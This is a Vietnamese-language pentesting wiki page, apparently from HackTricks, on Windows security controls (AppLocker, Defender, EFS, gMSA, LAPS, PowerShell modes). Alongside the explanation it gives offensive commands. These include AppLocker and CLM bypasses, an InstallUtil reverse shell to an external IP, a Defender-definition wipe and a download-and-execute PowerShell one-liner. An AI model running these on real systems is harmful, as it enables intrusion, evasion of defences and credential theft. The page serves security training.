# Các biện pháp kiểm soát bảo mật của Windows

{{#include ../banners/hacktricks-training.md}}

## Chính sách AppLocker

Danh sách cho phép ứng dụng là danh sách các ứng dụng phần mềm hoặc tệp thực thi đã được phê duyệt, được phép hiện diện và chạy trên hệ thống. Mục tiêu là bảo vệ môi trường khỏi malware gây hại và phần mềm chưa được phê duyệt, không phù hợp với nhu cầu kinh doanh cụ thể của tổ chức.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) là **giải pháp lập danh sách cho phép ứng dụng** của Microsoft, cho phép quản trị viên hệ thống kiểm soát **những ứng dụng và tệp nào người dùng có thể chạy**. Giải pháp này cung cấp **khả năng kiểm soát chi tiết** đối với tệp thực thi, script, tệp cài đặt Windows, DLL, ứng dụng đóng gói và trình cài đặt ứng dụng đóng gói.\
Các tổ chức thường **chặn cmd.exe và PowerShell.exe** cũng như quyền ghi vào một số thư mục, **nhưng tất cả những biện pháp này đều có thể bị vượt qua**.

### Kiểm tra

Kiểm tra những tệp/phần mở rộng nào nằm trong danh sách chặn/danh sách cho phép:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

`Test-AppLockerPolicy` đánh giá các tệp ứng viên cho một danh tính cụ thể theo chính sách AppLocker. Hãy kiểm tra tài khoản có token sẽ thực thi payload, vì các quy tắc có thể nhắm đến người dùng hoặc nhóm; `Get-AppLockerFileInformation` cũng hữu ích để kiểm tra đường dẫn, hash và metadata nhà phát hành mà các quy tắc có thể khớp.<sup>[[5]](#references)</sup>

```powershell
$policy = Get-AppLockerPolicy -Effective
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
Test-AppLockerPolicy -PolicyObject $policy -Path C:\Users\Public\payload.exe -User $user
Get-AppLockerFileInformation -Path C:\Users\Public\payload.exe | Format-List
```

Trước khi xem một kết quả kiểm tra bị từ chối là dấu hiệu quy tắc đang chặn thực thi, hãy kiểm tra **chế độ thực thi hiệu lực của bộ sưu tập quy tắc đó** và dịch vụ Application Identity. `AuditOnly` đánh giá các quy tắc nhưng vẫn cho phép thực thi, trong khi `NotConfigured` không đồng nghĩa với việc bị tắt nếu bộ sưu tập đó có chứa quy tắc.<sup>[[7]](#references)</sup> `AppIDSvc` đã dừng sẽ ngăn AppLocker thực thi.<sup>[[9]](#references)</sup> Các bước kiểm tra này giúp phân biệt một bypass thực sự với một chính sách vốn chưa từng chặn tệp.

```powershell
(Get-AppLockerPolicy -Effective).RuleCollections | Select-Object CollectionType, EnforcementMode
Get-Service AppIDSvc
Get-AppLockerFileInformation -EventLog -EventType Audited -Statistics
```

Đối với bài kiểm tra thực thi có kiểm soát, hãy kiểm tra event log của AppLocker: **8003/8006** nghĩa là EXE/DLL hoặc script/MSI sẽ bị chặn trong audit mode; **8004/8007** nghĩa là chúng đã thực sự bị chặn. Hãy kiểm tra cùng loại tệp và danh tính như trong đường dẫn thực thi dự kiến.<sup>[[8]](#references)</sup>

Đường dẫn registry này chứa các cấu hình và chính sách được AppLocker áp dụng, giúp xem lại tập hợp quy tắc hiện đang được thực thi trên hệ thống:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- **Writable folders** hữu ích để bypass AppLocker Policy: Nếu AppLocker cho phép thực thi bất kỳ thứ gì bên trong `C:\Windows\System32` hoặc `C:\Windows`, bạn có thể dùng các **writable folders** để **bypass** chính sách này.

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- Các binary [**"LOLBAS's"**](https://lolbas-project.github.io/) thường được **tin cậy** cũng có thể hữu ích để bypass AppLocker.
- **Các quy tắc được viết kém cũng có thể bị bypass**
  - Ví dụ: **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, bạn có thể tạo một **thư mục tên `allowed`** ở bất kỳ đâu và thư mục đó sẽ được cho phép.
  - Các tổ chức cũng thường tập trung vào việc **chặn executable `%System32%\WindowsPowerShell\v1.0\powershell.exe`**, nhưng lại quên các **vị trí khác** của [**executable PowerShell**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations), chẳng hạn như `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` hoặc `PowerShell_ISE.exe`.
- **DLL enforcement rất hiếm khi được bật** do có thể làm tăng tải cho hệ thống và cần nhiều thử nghiệm để đảm bảo không có gì bị lỗi. Vì vậy, dùng **DLL làm backdoor sẽ giúp bypass AppLocker**.
- Bạn có thể dùng [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) hoặc [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) để **thực thi** code Powershell trong bất kỳ process nào và bypass AppLocker. Để biết thêm thông tin, xem: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Lưu trữ thông tin xác thực

### Security Accounts Manager (SAM)

Thông tin xác thực cục bộ nằm trong file này; mật khẩu được lưu dưới dạng hash.

### Local Security Authority (LSA) - LSASS

**Thông tin xác thực** (đã hash) được **lưu** trong **bộ nhớ** của subsystem này để hỗ trợ Single Sign-On.\
**LSA** quản lý **chính sách bảo mật** cục bộ (chính sách mật khẩu, quyền của người dùng...), **xác thực**, **access token**...\
LSA sẽ **kiểm tra** thông tin xác thực được cung cấp trong file **SAM** (khi đăng nhập cục bộ) và **liên lạc** với **domain controller** để xác thực người dùng domain.

**Thông tin xác thực** được **lưu** bên trong **process LSASS**: vé Kerberos, hash NT và LM, mật khẩu có thể dễ dàng giải mã.

### LSA secrets

LSA có thể lưu một số thông tin xác thực trên đĩa:

- Mật khẩu của tài khoản máy tính trong Active Directory (khi không thể kết nối với domain controller).
- Mật khẩu của các tài khoản dịch vụ Windows
- Mật khẩu cho các tác vụ đã lên lịch
- Các thông tin khác (mật khẩu của ứng dụng IIS...)

### NTDS.dit

Đây là database của Active Directory. File này chỉ có trên Domain Controller.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) là một antivirus có trong Windows 10, Windows 11 và các phiên bản Windows Server. Nó **chặn** các công cụ pentesting phổ biến như **`WinPEAS`**. Tuy nhiên, có nhiều cách để **bypass các biện pháp bảo vệ này**.

### Kiểm tra

Để kiểm tra **trạng thái** của **Defender**, bạn có thể chạy PS cmdlet **`Get-MpComputerStatus`** (kiểm tra giá trị **`RealTimeProtectionEnabled`** để biết tính năng này có đang hoạt động hay không):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Bạn cũng có thể chạy lệnh sau để enumerate:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Hệ thống tệp được mã hóa (EFS)

EFS bảo vệ các tệp bằng mã hóa, sử dụng **khóa đối xứng** có tên là **Khóa mã hóa tệp (FEK)**. Khóa này được mã hóa bằng **khóa công khai** của người dùng và lưu trong metadata NTFS `$EFS` của tệp (`$LOGGED_UTILITY_STREAM`), **không phải** trong một alternate data stream `$DATA` thông thường.<sup>[[10]](#references)</sup> Khi cần giải mã, **khóa riêng tư** tương ứng với chứng chỉ số của người dùng sẽ giải bọc FEK. Tác nhân khôi phục dữ liệu (DRA) được cấu hình có một bản sao FEK đã mã hóa riêng trong Trường khôi phục dữ liệu.<sup>[[13]](#references)</sup>

**Các trường hợp giải mã không cần người dùng khởi tạo** gồm:

- Khi tệp hoặc thư mục được chuyển sang hệ thống tệp không hỗ trợ EFS, chẳng hạn như [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), chúng sẽ tự động được giải mã.
- Các tệp đã mã hóa được gửi qua mạng bằng giao thức SMB/CIFS sẽ được giải mã trước khi truyền.

Phương thức mã hóa này cho phép chủ sở hữu **truy cập minh bạch** các tệp đã mã hóa. Tuy nhiên, chỉ đổi mật khẩu của chủ sở hữu rồi đăng nhập sẽ không cho phép giải mã.

**Điểm chính**:

- EFS sử dụng FEK đối xứng, được mã hóa bằng khóa công khai của người dùng.
- Quá trình giải mã dùng khóa riêng tư của người dùng để truy cập FEK.
- Việc giải mã tự động diễn ra trong một số điều kiện cụ thể, chẳng hạn như sao chép sang FAT32 hoặc truyền qua mạng.
- Chủ sở hữu có thể truy cập các tệp đã mã hóa mà không cần thực hiện thêm bước nào.

### Kiểm tra thông tin EFS

Không nên suy luận rằng EFS đang được sử dụng chỉ dựa vào `%APPDATA%\Microsoft\Protect`: thư mục này lưu các khóa chính DPAPI dùng cho nhiều tính năng của Windows.<sup>[[19]](#references)</sup> Thay vào đó, hãy kiểm tra một tệp đã mã hóa bằng `cipher /c "C:\path\file"` để liệt kê chứng chỉ người dùng và chứng chỉ khôi phục của tệp. `cipher /e` và `cipher /d` mã hóa và giải mã tệp cho một principal có khóa riêng tư tương ứng.<sup>[[11]](#references)</sup>

### Giải mã tệp EFS

Nếu `cipher /c` liệt kê một chứng chỉ khôi phục và bạn có **khóa riêng tư DRA tương ứng** trong tệp PFX, hãy nhập tệp PFX đó vào kho chứng chỉ của người dùng hiện tại, sau đó giải mã tệp.<sup>[[11]](#references)[[12]](#references)</sup> Chứng chỉ DRA mới được tạo sẽ không thể giải mã các tệp cũ: khóa công khai của chứng chỉ đó phải được đưa vào ngay khi tệp được mã hóa. Quyền truy cập NTFS ACL hoặc chỉ đặt lại mật khẩu tài khoản sẽ không cung cấp khóa riêng tư cần thiết.<sup>[[13]](#references)</sup>

```cmd
cipher /c "C:\path\file"
certutil -user -importPFX My recovery.pfx
cipher /d "C:\path\file"
```

#### Có quyền System Authority

Cách tiếp cận này yêu cầu **người dùng mục tiêu** phải **đang chạy** một **process** trên host. Nếu đúng vậy, từ một phiên `meterpreter`, bạn có thể giả mạo token process của người dùng (`impersonate_token` từ `incognito`). Ngoài ra, bạn có thể `migrate` vào process của người dùng.

#### Biết mật khẩu của người dùng

Mimikatz có thể import certificate và private key của người dùng, sau đó dùng chúng để giải mã các file được bảo vệ bằng EFS.<sup>[[2]](#references)</sup>

{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft phát triển **Group Managed Service Accounts (gMSA)** để đơn giản hóa việc quản lý service account trong hạ tầng IT. Không giống các service account truyền thống thường bật cài đặt "**Mật khẩu không bao giờ hết hạn**", gMSA mang lại giải pháp an toàn và dễ quản lý hơn:

- **Tự động quản lý mật khẩu**: gMSA sử dụng mật khẩu phức tạp dài 240 byte, thường được thay đổi mỗi 30 ngày. Domain controller tạo mật khẩu này bằng key material của KDS, loại bỏ nhu cầu cập nhật mật khẩu thủ công.<sup>[[16]](#references)[[20]](#references)</sup>
- **Tăng cường bảo mật**: Các account này không bị khóa và không thể dùng để đăng nhập tương tác, giúp tăng cường bảo mật.
- **Hỗ trợ nhiều host**: gMSA có thể được chia sẻ giữa nhiều host, rất phù hợp với các service chạy trên nhiều server.
- **Hỗ trợ tác vụ được lên lịch**: Không giống managed service account, gMSA hỗ trợ chạy các tác vụ được lên lịch.
- **Đơn giản hóa việc quản lý SPN**: Hệ thống tự động cập nhật Service Principal Name (SPN) khi thông tin sAMaccount hoặc DNS name của máy tính thay đổi, giúp đơn giản hóa việc quản lý SPN.

Domain controller tạo LDAP attribute _**msDS-ManagedPassword**_ khi đọc, dựa trên password material được tạo từ KDS; giá trị này không phải là một mật khẩu được lưu trữ độc lập. Thông thường, giá trị này thay đổi mỗi 30 ngày.<sup>[[20]](#references)</sup> [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) được trả về **không phải là mật khẩu đã mã hóa**: trường `CurrentPassword` chứa mật khẩu dạng văn bản thuần.<sup>[[14]](#references)</sup> Quyền truy cập được kiểm tra dựa trên `msDS-GroupMSAMembership`, vì vậy mọi principal được cấp quyền truy xuất đều thuộc phạm vi này, không chỉ administrator hoặc host chạy service.<sup>[[15]](#references)</sup> Kết nối LDAP phải đảm bảo tính bảo mật, chẳng hạn thông qua LDAPS hoặc SASL sealing.<sup>[[20]](#references)</sup>

Để tìm hiểu cách tạo mật khẩu ngoại tuyến sau khi KDS root key bị lộ, xem [Golden gMSA/dMSA](active-directory-methodology/golden-dmsa-gmsa.md).

![https://cube0x0.github.io/Relaying-for-gMSA/](../images/asd1.png)<sup>[[3]](#references)</sup>

Bạn có thể đọc mật khẩu này bằng [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**

```
/GMSAPasswordReader --AccountName jkohler
```

[**Tìm hiểu thêm trong bài viết này**](https://cube0x0.github.io/Relaying-for-gMSA/)<sup>[[3]](#references)</sup>

Ngoài ra, hãy xem [trang web này](https://cube0x0.github.io/Relaying-for-gMSA/) để biết cách thực hiện **NTLM relay attack** nhằm **đọc** **mật khẩu** của **gMSA**.<sup>[[3]](#references)</sup>

## LAPS

Trong quá trình enumeration, hãy phân biệt **Microsoft LAPS legacy** với cách triển khai **Windows LAPS** gốc. Windows LAPS được phát hành trong các bản cập nhật Windows ngày 11 tháng 4 năm 2023 và có thể sao lưu mật khẩu quản trị viên cục bộ được quản lý vào **Windows Server Active Directory** hoặc **Microsoft Entra ID**. Trong các môi trường triển khai dựa trên AD, tính năng này còn có thể mã hóa mật khẩu, lưu giữ lịch sử mật khẩu đã mã hóa và quản lý mật khẩu DSRM của domain controller. MSI legacy có thể tải xuống đã bị loại bỏ trên các phiên bản Windows mới hơn, dù Windows LAPS vẫn có thể hoạt động ở chế độ mô phỏng legacy.<sup>[[6]](#references)</sup>

Vì Microsoft LAPS legacy và Windows LAPS là hai cách triển khai riêng biệt, hãy xác định cách nào đang được triển khai trước khi áp dụng các cuộc tấn công phụ thuộc vào attribute hoặc cmdlet. Trang được liên kết trình bày cách phát hiện, enumeration ACL, truy xuất, thay đổi thời hạn hết hạn và khôi phục offline mà không lặp lại các quy trình đó ở đây.<sup>[[6]](#references)</sup>

{{#ref}}
active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **hạn chế nhiều tính năng** cần thiết để sử dụng PowerShell hiệu quả, chẳng hạn như chặn đối tượng COM, chỉ cho phép các kiểu .NET được phê duyệt, workflow dựa trên XAML, lớp PowerShell và nhiều tính năng khác.

### **Kiểm tra**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

`powershell.exe -Version 2` là một cách downgrade cũ, chỉ áp dụng trên các máy chủ đã cài engine PowerShell 2 tùy chọn. Tính năng này không còn được tích hợp trong Windows 11 24H2 hoặc Windows Server 2025 đã cập nhật; đừng xem đây là một cách bypass CLM hiện nay.<sup>[[17]](#references)</sup> Khi có application control, PowerShell chạy mã không đáng tin cậy trong Constrained Language, còn các script được policy tin cậy có thể chạy trong Full Language.<sup>[[18]](#references)</sup>

Với các cấu hình cũ hơn, bạn có thể dùng [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM).\
**Để biên dịch, bạn có thể cần** **thêm** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> thêm `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` và **đổi project sang .Net4.5**.

#### Direct bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

Bạn có thể dùng [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) hoặc [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) để **thực thi** mã Powershell trong bất kỳ tiến trình nào và bỏ qua chế độ bị giới hạn. Để biết thêm thông tin, hãy xem: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[1]](#references)</sup>

## Chính sách thực thi PS

Theo mặc định, chính sách này được đặt thành **restricted.** Các cách chính để bỏ qua chính sách này:<sup>[[4]](#references)</sup>

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

Có thể tìm hiểu thêm [tại đây](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[4]](#references)</sup>

## Giao diện Nhà cung cấp Hỗ trợ Bảo mật (SSPI)

Đây là API có thể dùng để xác thực người dùng.

SSPI chịu trách nhiệm tìm giao thức phù hợp cho hai máy muốn giao tiếp. Kerberos là phương thức được ưu tiên. Sau đó, SSPI sẽ thương lượng giao thức xác thực sẽ được sử dụng. Các giao thức xác thực này được gọi là Nhà cung cấp Hỗ trợ Bảo mật (SSP), nằm trong mỗi máy Windows dưới dạng DLL và cả hai máy phải hỗ trợ cùng một giao thức để có thể giao tiếp.

### Các SSP chính

- **Kerberos**: Được ưu tiên sử dụng
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** và **NTLMv2**: Vì lý do tương thích
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Máy chủ web và LDAP, mật khẩu ở dạng hash MD5
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL và TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Được dùng để thương lượng giao thức sẽ sử dụng (Kerberos hoặc NTLM, trong đó Kerberos là giao thức mặc định)
  - %windir%\Windows\System32\lsasrv.dll

#### Quá trình thương lượng có thể đưa ra nhiều phương thức hoặc chỉ một phương thức.

## UAC - Kiểm soát Tài khoản Người dùng

[Kiểm soát Tài khoản Người dùng (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) là một tính năng cho phép **hiển thị lời nhắc chấp thuận đối với các hoạt động cần quyền nâng cao**.

{{#ref}}
authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}




## References

- [1] [Vượt qua AppLocker và chế độ ngôn ngữ bị giới hạn của PowerShell](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [2] [cách giải mã tệp EFS](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [3] [Chuyển tiếp cho gMSA](https://cube0x0.github.io/Relaying-for-gMSA/)
- [4] [15 cách vượt qua chính sách thực thi PowerShell](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [5] [Sử dụng các lệnh ghép ngắn PowerShell của AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/use-the-applocker-windows-powershell-cmdlets)
- [6] [Tổng quan về Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [7] [Làm việc với các quy tắc AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/working-with-applocker-rules)
- [8] [Sử dụng Event Viewer với AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/using-event-viewer-with-applocker)
- [9] [Các quy trình và tương tác của AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-processes-and-interactions)
- [10] [Luồng tệp (hệ thống tệp cục bộ)](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams)
- [11] [Lệnh Cipher](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cipher)
- [12] [Lệnh Certutil](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [13] [Sao lưu khóa riêng EFS của tác nhân khôi phục](https://learn.microsoft.com/en-us/troubleshoot/windows-server/certificates-and-public-key-infrastructure-pki/back-up-recovery-agent-efs-private-key)
- [14] [MSDS-MANAGEDPASSWORD_BLOB](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)
- [15] [Thuộc tính ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [16] [Bảo mật tài khoản dịch vụ được quản lý theo nhóm](https://learn.microsoft.com/en-us/entra/architecture/service-accounts-group-managed)
- [17] [Các tính năng bị loại bỏ khỏi Windows client](https://learn.microsoft.com/en-us/windows/whats-new/removed-features)
- [18] [Sử dụng App Control để bảo mật PowerShell](https://learn.microsoft.com/en-us/powershell/scripting/security/app-control/application-control)
- [19] [Sự kiện 4693 và khóa chính DPAPI](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4693)
- [20] [Cấu trúc msDS-ManagedPassword](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/9cd2fc5e-7305-4fb8-b233-2a60bc3eec68)
{{#include ../banners/hacktricks-training.md}}
